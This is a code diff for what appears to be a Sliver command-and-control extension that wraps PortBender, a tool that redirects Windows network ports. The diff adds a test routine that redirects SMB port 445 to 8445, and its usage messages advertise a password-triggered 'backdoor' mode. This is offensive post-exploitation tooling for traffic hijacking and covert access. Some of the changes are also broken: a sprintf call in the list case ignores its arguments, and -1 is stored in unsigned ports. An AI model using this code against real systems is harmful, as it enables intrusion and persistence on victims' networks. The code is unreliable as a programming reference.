@@ -6,31 +6,19 @@
 
 #pragma warning(disable : 4996)
 
-//
-//// Esempio di variabile esportata
-//SLIVERPORTBENDER_API int nSliverPortBender=0;
-//
-//// Esempio di funzione esportata.
-//SLIVERPORTBENDER_API int fnSliverPortBender(void)
-//{
-//    return 0;
-//}
-//
-//// Costruttore di una classe esportata.
-//CSliverPortBender::CSliverPortBender()
-//{
-//    return;
-//}
-
 PortBenderWrapper::PortBenderWrapper(PortBender _portbender) : portbender(_portbender) {
     
+}
+
+PortBenderWrapper::~PortBenderWrapper() {
 }
 
 PortBenderWrapper::PortBenderWrapper(const PortBenderWrapper& source) : portbender(source.portbender) {
 
 }
+
 void PortBenderWrapper::start(){
-   this->thread_ptr = std::make_unique<std::thread>(&PortBender::Start,this->portbender);
+   this->thread_ptr = std::make_unique<std::thread>(&PortBender::Start,&this->portbender);
 }
 
 void PortBenderWrapper::stop() {
@@ -88,23 +76,36 @@ bool PortBenderManager::stop(int key) {
     return true;
 }
 
-bool PortBenderManager::getData(int key) {
+std::pair<UINT16,UINT16> PortBenderManager::getData(int key) {
     auto ret = this->manager.find(key);
     if (ret == this->manager.end()) {
-        return false;
+        return std::pair<UINT16,UINT16>(-1,-1);
     }
-    ret->second->getData();
-
-    return true;
+    return ret->second->getData();
 }
 
 std::unique_ptr<PortBenderManager> manager{ nullptr };
+
+int func(const char* buff, int n) {
+    return 0;
+}
+
+int fakeEntryPoint() {
+    char buff[100] = { '\0' };
+    strcpy(buff, "1 redirect 445 8445");
+    entrypoint(buff, strlen(buff), func);
+    Sleep(1000 * 120);
+    strcpy(buff, "0 remove 0");
+    entrypoint(buff, strlen(buff), func);
+    return 0;
+}
 
 int entrypoint(char* argsBuffer, uint32_t bufferSize, goCallback callback)
 {
     if (manager == nullptr) {
         manager = std::make_unique<PortBenderManager>();
     }
+    
     int cmd = -1;
     if (bufferSize < 1)
     {
@@ -123,17 +124,16 @@ int entrypoint(char* argsBuffer, uint32_t bufferSize, goCallback callback)
 
             if (args.Action == "remove") {
                 if (manager->stop(args.id) && manager->remove(args.id)) {
-                    char buffer[100] = { 0 };
+                    char buffer[100] = { '\0' };
                     sprintf(buffer, "successfully removed portBender with Id% d\n", args.id);
                     callback(buffer, strlen(buffer));
                 }
                 else {
-                    char buffer[100] = { 0 };
+                    char buffer[100] = { '\0' };
                     sprintf(buffer, "unable to remove portBender with Id %d\n", args.id);
                     callback(buffer, strlen(buffer));
                 }
             }
-            break;
         }
         catch (const std::invalid_argument&) {
             std::string msg("Redirect Usage : PortBender redirect FakeDstPort RedirectedPort\n");
@@ -147,9 +147,15 @@ int entrypoint(char* argsBuffer, uint32_t bufferSize, goCallback callback)
             msg = "\tPortBender backdoor 443 3389 praetorian.antihacker\n";
             callback(msg.c_str(), msg.length());
         }
+        catch (const std::exception& e) {
+            std::string msg(e.what());
+            callback(msg.c_str(), msg.length());
+        }
+        break;
     }
 
     case 1: //start
+    {
         try {
             Arguments args = Arguments(argsBuffer + 2);
 
@@ -165,9 +171,7 @@ int entrypoint(char* argsBuffer, uint32_t bufferSize, goCallback callback)
                 if (std::get<1>(tp)) {
                     manager->start(std::get<0>(tp));
                 }
-
             }
-            break;
         }
         catch (const std::invalid_argument&) {
             std::string msg("Redirect Usage : PortBender redirect FakeDstPort RedirectedPort\n");
@@ -181,17 +185,25 @@ int entrypoint(char* argsBuffer, uint32_t bufferSize, goCallback callback)
             msg = "\tPortBender backdoor 443 3389 praetorian.antihacker\n";
             callback(msg.c_str(), msg.length());
         }
+        catch (const std::exception& e) {
+            std::string msg(e.what());
+            callback(msg.c_str(), msg.length());
+        }
+        break;
+    }
     case 2: //list
-
-
-
+    {
+        auto data = manager->getData(0);
+        char buffer[100] = { '\0' };
+        sprintf(buffer, "data for id 0: fakeport redirectport", data.first, data.second);
+        break;
+    }
     default:
     {
         std::string msg{ "invalid command received" };
         callback(msg.c_str(), msg.length());
     }
-
-
-    return 0;
     }
+    return 0;
+
 }
